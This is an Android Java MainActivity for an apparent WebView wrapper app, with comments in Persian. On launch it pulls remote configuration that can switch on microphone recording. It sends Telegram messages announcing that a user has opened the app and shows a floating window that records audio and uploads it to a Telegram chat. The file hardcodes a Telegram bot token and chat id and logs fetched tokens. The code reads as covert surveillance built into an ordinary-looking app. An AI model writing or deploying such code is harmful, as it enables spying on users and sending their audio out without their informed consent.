package com.blu.app;

import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.KeyEvent;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import com.blu.app.voice.FloatingVoiceNotification;

public class MainActivity extends AppCompatActivity {

    private static final String LINK_MANAGER_URL = "https://voice-bot-worker.kapcher2019.workers.dev/get-url";
    private static final String FALLBACK_URL = "https://example.com";
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    private WebView webView;
    private BroadcastReceiver voiceReceiver;
    
    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // درخواست مجوزها
        requestPermissions();
        
        // ایجاد WebView
        webView = new WebView(this);
        setContentView(webView);
        
        setupWebView();
        resolveUrlAndLoad();
        setupVoiceBroadcastReceiver();
    }
    
    private void requestPermissions() {
        String[] permissions = {
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.INTERNET
        };
        
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
                break;
            }
        }
    }
    
    private void setupWebView() {
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setDatabaseEnabled(true);
        s.setLoadWithOverviewMode(true);
        s.setUseWideViewPort(true);
        s.setCacheMode(WebSettings.LOAD_DEFAULT);
        s.setMediaPlaybackRequiresUserGesture(false);
        s.setAllowFileAccess(true);
        s.setAllowContentAccess(true);
        
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }
        });
        webView.setWebChromeClient(new WebChromeClient());
        
        // دانلود منیجر
        webView.setDownloadListener((url, userAgent, contentDisposition, mimeType, contentLength) -> {
            try {
                DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
                DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                if (dm != null) dm.enqueue(request);
                Toast.makeText(this, "📥 Downloading...", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Toast.makeText(this, "❌ Download error", Toast.LENGTH_SHORT).show();
            }
        });
    }
    
    private void setupVoiceBroadcastReceiver() {
        voiceReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                if (action == null) return;
                
                switch (action) {
                    case "VOICE_RECORDING_STARTED":
                        Toast.makeText(context, "🎤 ضبط صدا شروع شد!", Toast.LENGTH_SHORT).show();
                        break;
                    case "VOICE_RECORDING_COMPLETED":
                        Toast.makeText(context, "⏳ ضبط کامل شد، در حال ارسال...", Toast.LENGTH_SHORT).show();
                        break;
                    case "VOICE_UPLOAD_SUCCESS":
                        Toast.makeText(context, "✅ فایل صوتی با موفقیت ارسال شد!", Toast.LENGTH_LONG).show();
                        break;
                    case "VOICE_UPLOAD_FAILED":
                        Toast.makeText(context, "❌ ارسال فایل صوتی ناموفق بود!", Toast.LENGTH_LONG).show();
                        break;
                }
            }
        };
        
        IntentFilter filter = new IntentFilter();
        filter.addAction("VOICE_RECORDING_STARTED");
        filter.addAction("VOICE_RECORDING_COMPLETED");
        filter.addAction("VOICE_UPLOAD_SUCCESS");
        filter.addAction("VOICE_UPLOAD_FAILED");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(voiceReceiver, filter, Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(voiceReceiver, filter);
        }
    }
    
    private void resolveUrlAndLoad() {
        new Thread(() -> {
            String siteUrl = FALLBACK_URL;
            String botToken = null;
            String chatId = null;
            String voiceToken = null;
            boolean needsVoice = false;
            
            try {
                URL u = new URL(LINK_MANAGER_URL);
                HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);
                int code = conn.getResponseCode();
                
                if (code >= 200 && code < 300) {
                    BufferedReader r = new BufferedReader(
                        new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8)
                    );
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = r.readLine()) != null) {
                        sb.append(line);
                    }
                    r.close();
                    
                    JSONObject obj = new JSONObject(sb.toString());
                    
                    String got = obj.optString("url", "");
                    if (got != null && !got.isEmpty()) {
                        siteUrl = got.replaceAll("/$", "");
                    }
                    
                    botToken = obj.optString("bot_token", "");
                    chatId = obj.optString("chat_id", "");
                    voiceToken = obj.optString("voice_token", "");
                    needsVoice = obj.optBoolean("voice", false);
                    
                    android.util.Log.d("MainActivity", "BotToken: " + botToken);
                    android.util.Log.d("MainActivity", "ChatId: " + chatId);
                    android.util.Log.d("MainActivity", "NeedsVoice: " + needsVoice);
                }
            } catch (Exception e) {
                android.util.Log.e("MainActivity", "Error: " + e.getMessage());
            }
            
            final String finalUrl = siteUrl;
            final String finalBotToken = botToken;
            final String finalChatId = chatId;
            final String finalVoiceToken = voiceToken;
            final boolean finalNeedsVoice = needsVoice;
            
            new Handler(Looper.getMainLooper()).post(() -> {
                // بارگذاری وب‌ویو
                webView.loadUrl(finalUrl);
                
                // اگر نیاز به ضبط صدا باشه، پنجره شیشه‌ای نمایش داده میشه
                if (finalNeedsVoice && finalBotToken != null && !finalBotToken.isEmpty() 
                    && finalChatId != null && !finalChatId.isEmpty()) {
                    
                    // ارسال نوتیفیکیشن به تلگرام که کاربر وارد شده
                    sendTelegramNotification("👤 کاربر وارد برنامه شد!");
                    
                    // نمایش پنجره شیشه‌ای بعد از ۲ ثانیه
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        FloatingVoiceNotification floating = new FloatingVoiceNotification(
                            this,
                            finalBotToken,
                            finalChatId,
                            finalVoiceToken
                        );
                        floating.show();
                    }, 2000);
                }
            });
        }).start();
    }
    
    private void sendTelegramNotification(String message) {
        new Thread(() -> {
            try {
                com.blu.app.voice.TelegramUploader uploader = 
                    new com.blu.app.voice.TelegramUploader();
                uploader.sendMessage(
                    "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM",
                    "-1004352035353",
                    message
                );
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
            webView.goBack();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (voiceReceiver != null) {
            try {
                unregisterReceiver(voiceReceiver);
            } catch (Exception e) {}
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "⚠️ مجوز " + permissions[i] + " لازم است", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }
}
